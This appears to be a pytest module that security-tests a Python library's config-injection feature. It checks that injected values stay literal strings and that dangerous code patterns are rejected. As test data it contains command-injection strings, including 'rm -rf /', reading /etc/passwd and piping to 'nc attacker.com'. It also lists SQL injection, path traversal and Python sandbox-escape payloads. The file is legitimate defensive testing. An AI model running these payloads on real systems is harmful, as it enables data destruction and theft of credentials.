"""Security tests for safe seamless injection mode.

This module tests that the new SafeSeamlessProvider implementation
is secure and doesn't allow code injection or other exploits.
"""

import ast
import inspect

import pytest

from traigent.config.ast_transformer import ConfigTransformer, SafeASTCompiler
from traigent.config.providers import SeamlessParameterProvider


class TestASTTransformerSecurity:
    """Test AST transformer security features."""

    def test_no_exec_usage(self):
        """Verify that SeamlessParameterProvider doesn't use exec()."""
        # Get the source code of SeamlessParameterProvider
        source = inspect.getsource(SeamlessParameterProvider)

        # Parse to AST
        tree = ast.parse(source)

        # Check for exec calls
        exec_calls = [
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.Call)
            and isinstance(node.func, ast.Name)
            and node.func.id == "exec"
        ]
        assert len(exec_calls) == 0, "Found exec() call in SeamlessParameterProvider"

    def test_no_eval_usage(self):
        """Verify that SeamlessParameterProvider doesn't use eval()."""
        source = inspect.getsource(SeamlessParameterProvider)
        tree = ast.parse(source)

        eval_calls = [
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.Call)
            and isinstance(node.func, ast.Name)
            and node.func.id == "eval"
        ]
        assert len(eval_calls) == 0, "Found eval() call in SeamlessParameterProvider"

    def test_import_injection_blocked(self):
        """Test that import statements cannot be injected."""
        config = {"malicious": "__import__('os').system('echo hacked')"}
        transformer = ConfigTransformer(config)

        # Try to transform code with the malicious config
        source = "malicious = 'safe_value'"
        tree = ast.parse(source)
        modified_tree = transformer.visit(tree)

        # The transformer should not create import nodes
        for node in ast.walk(modified_tree):
            assert not isinstance(node, (ast.Import, ast.ImportFrom))

    def test_dangerous_function_calls_blocked(self):
        """Test that dangerous function calls are blocked."""
        # Test various dangerous patterns
        dangerous_configs = [
            {"var": "open('/etc/passwd').read()"},
            {"var": "exec('malicious code')"},
            {"var": "eval('malicious expression')"},
            {"var": "__import__('os')"},
            {"var": "compile('bad', 'file', 'exec')"},
        ]

        for config in dangerous_configs:
            transformer = ConfigTransformer(config)
            source = "var = 'safe'"
            tree = ast.parse(source)
            modified_tree = transformer.visit(tree)

            # Validate that dangerous operations are blocked
            assert SafeASTCompiler.validate_ast(modified_tree)

    def test_file_access_blocked(self):
        """Test that file system access is blocked."""
        provider = SeamlessParameterProvider()

        def test_func():
            filename = "/etc/passwd"
            return filename

        # Try to inject a path that could be misused
        config = {"filename": "../../../etc/passwd"}
        wrapped = provider.inject_config(test_func, config)

        # The function should still work but only replace the string
        result = wrapped()
        assert result == "../../../etc/passwd"  # Just a string, not file access

    def test_attribute_access_restrictions(self):
        """Test that dangerous attribute access is blocked."""
        compiler = SafeASTCompiler()

        # Test dangerous attribute patterns
        dangerous_code = """
def func():
    obj.__class__.__bases__[0].__subclasses__()
    return "done"
"""
        tree = ast.parse(dangerous_code)

        # Should not validate due to dangerous __class__ access
        assert not compiler.validate_ast(tree)

    def test_globals_locals_access_blocked(self):
        """Test that globals() and locals() access is blocked."""
        compiler = SafeASTCompiler()

        dangerous_patterns = [
            "globals()['__builtins__']",
            "locals()['__builtins__']",
            "vars()['secret']",
            "dir(obj)",
        ]

        for pattern in dangerous_patterns:
            code = f"def func():\n    return {pattern}"
            tree = ast.parse(code)
            assert not compiler.validate_ast(tree)


class TestSeamlessParameterProvider:
    """Test the SeamlessParameterProvider implementation."""

    def test_basic_injection_works(self):
        """Test that basic configuration injection still works."""
        provider = SeamlessParameterProvider()

        def test_func():
            model = "gpt-3.5"
            temperature = 0.7
            return f"{model} at {temperature}"

        config = {"model": "gpt-4", "temperature": 0.2}
        wrapped = provider.inject_config(test_func, config)

        result = wrapped()
        assert "gpt-4" in result
        assert "0.2" in result

    def test_no_code_execution(self):
        """Test that code in config values is not executed."""
        provider = SeamlessParameterProvider()

        def test_func():
            value = "default"
            return value

        # Try to inject code as a string
        config = {"value": "os.system('echo hacked')"}
        wrapped = provider.inject_config(test_func, config)

        result = wrapped()
        # Should return the string literally, not execute it
        assert result == "os.system('echo hacked')"

    def test_complex_value_injection(self):
        """Test injection of complex but safe values."""
        provider = SeamlessParameterProvider()

        def test_func():
            config_dict = {}
            config_list = []
            return config_dict, config_list

        config = {
            "config_dict": {"key": "value", "nested": {"deep": "data"}},
            "config_list": [1, 2, "three", 4.0],
        }
        wrapped = provider.inject_config(test_func, config)

        result_dict, result_list = wrapped()
        assert result_dict == config["config_dict"]
        assert result_list == config["config_list"]

    def test_function_calls_preserved(self):
        """Test that legitimate function calls are preserved."""
        # This test verifies that the transformed function still has access
        # to other functions it calls. The transformation should only change
        # the variable assignment, not break function calls.
        provider = SeamlessParameterProvider()

        # Define a simple multiplication function outside test_func
        def multiply_by_two(x):
            return x * 2

        def test_func():
            # This value should be replaced by config
            value = 10
            # This function call should still work with the new value
            result = multiply_by_two(value)
            return result

        # IMPORTANT: The helper function must be in test_func's globals
        # BEFORE transformation for the transformed function to access it
        test_func.__globals__["multiply_by_two"] = multiply_by_two

        config = {"value": 20}
        wrapped = provider.inject_config(test_func, config)

        # The function should:
        # 1. Replace value = 10 with value = 20
        # 2. Call multiply_by_two(20) returning 40
        result = wrapped()
        assert result == 40

    def test_async_function_support(self):
        """Test that async functions are supported."""
        provider = SeamlessParameterProvider()

        async def test_func():
            model = "gpt-3.5"
            return model

        config = {"model": "gpt-4"}
        wrapped = provider.inject_config(test_func, config)

        # wrapped should be an async function
        assert inspect.iscoroutinefunction(wrapped)

        # Test execution (would need async context to actually run)
        import asyncio

        result = asyncio.run(wrapped())
        assert result == "gpt-4"

    def test_cache_functionality(self):
        """Test that transformed functions are cached."""
        provider = SeamlessParameterProvider()

        def test_func():
            value = "default"
            return value

        config = {"value": "cached"}

        # First call should transform and cache
        wrapped1 = provider.inject_config(test_func, config)
        result1 = wrapped1()

        # Second call should use cache
        wrapped2 = provider.inject_config(test_func, config)
        result2 = wrapped2()

        assert result1 == result2 == "cached"

        # Check that cache was used (cache should have at least one entry)
        assert len(provider._compiled_cache) > 0

    def test_error_fallback(self):
        """Test that errors fall back to original function."""
        provider = SeamlessParameterProvider()

        # Function that can't be transformed (no source available)
        import_func = __import__  # Built-in function

        config = {"something": "value"}
        wrapped = provider.inject_config(import_func, config)

        # Should fall back to original function
        result = wrapped("math")
        import math

        assert result == math


class TestInjectionAttackVectors:
    """Test various injection attack vectors."""

    def test_command_injection_blocked(self):
        """Test that command injection is blocked."""
        provider = SeamlessParameterProvider()

        def test_func():
            cmd = "ls"
            return cmd

        # Try various command injection patterns
        attacks = [
            "ls; rm -rf /",
            "ls && cat /etc/passwd",
            "ls | nc attacker.com 1234",
            "`cat /etc/passwd`",
            "$(whoami)",
        ]

        for attack in attacks:
            config = {"cmd": attack}
            wrapped = provider.inject_config(test_func, config)
            result = wrapped()

            # Should return the string, not execute it
            assert result == attack

    def test_sql_injection_safe(self):
        """Test that SQL injection patterns are just strings."""
        provider = SeamlessParameterProvider()

        def test_func():
            query = "SELECT * FROM users WHERE id = 1"
            return query

        # Try SQL injection
        config = {"query": "1; DROP TABLE users; --"}
        wrapped = provider.inject_config(test_func, config)

        result = wrapped()
        assert result == "1; DROP TABLE users; --"  # Just a string

    def test_path_traversal_safe(self):
        """Test that path traversal attempts are just strings."""
        provider = SeamlessParameterProvider()

        def test_func():
            path = "/app/data/file.txt"
            return path

        # Try path traversal
        attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "file://etc/passwd",
        ]

        for attack in attacks:
            config = {"path": attack}
            wrapped = provider.inject_config(test_func, config)
            result = wrapped()

            # Should return the string, not access the file
            assert result == attack

    def test_prototype_pollution_blocked(self):
        """Test that prototype pollution attempts are blocked."""
        provider = SeamlessParameterProvider()

        def test_func():
            obj = {}
            return obj

        # Try to inject __proto__ manipulation
        config = {"obj": {"__proto__": {"isAdmin": True}}}

        # The transformer should not allow __proto__ in dict keys
        wrapped = provider.inject_config(test_func, config)
        wrapped()

        # Should not pollute prototype
        assert not hasattr({}, "isAdmin")


class TestComplianceAndAudit:
    """Test compliance and audit features."""

    def test_transformation_logged(self, caplog):
        """Test that transformations are logged for audit."""
        provider = SeamlessParameterProvider()

        def test_func():
            value = "default"
            return value

        config = {"value": "logged"}
        wrapped = provider.inject_config(test_func, config)

        with caplog.at_level("DEBUG"):
            wrapped()

        # Check that transformation was logged
        assert "Modified variables" in caplog.text or "transform" in caplog.text.lower()

    def test_no_sensitive_data_logged(self, caplog):
        """Test that sensitive data is not logged."""
        provider = SeamlessParameterProvider()

        def test_func():
            return "done"

        config = {"api_key": "test_api_key_placeholder", "password": "SuperSecret123!"}

        wrapped = provider.inject_config(test_func, config)

        with caplog.at_level("DEBUG"):
            wrapped()

        # Check that actual values are not in logs
        assert "test_api_key_placeholder" not in caplog.text
        assert "SuperSecret123!" not in caplog.text

    def test_safe_types_only(self):
        """Test that only safe types can be injected."""
        transformer = ConfigTransformer({})

        # Safe types should work
        safe_values = [
            None,
            True,
            False,
            42,
            3.14,
            "string",
            [1, 2, 3],
            (1, 2, 3),
            {"key": "value"},
        ]

        for value in safe_values:
            node = transformer._create_value_node(value)
            assert node is not None

        # Unsafe types should be rejected
        class CustomClass:
            pass

        unsafe_values = [CustomClass(), lambda x: x, open, compile]

        for value in unsafe_values:
            node = transformer._create_value_node(value)
            assert node is None
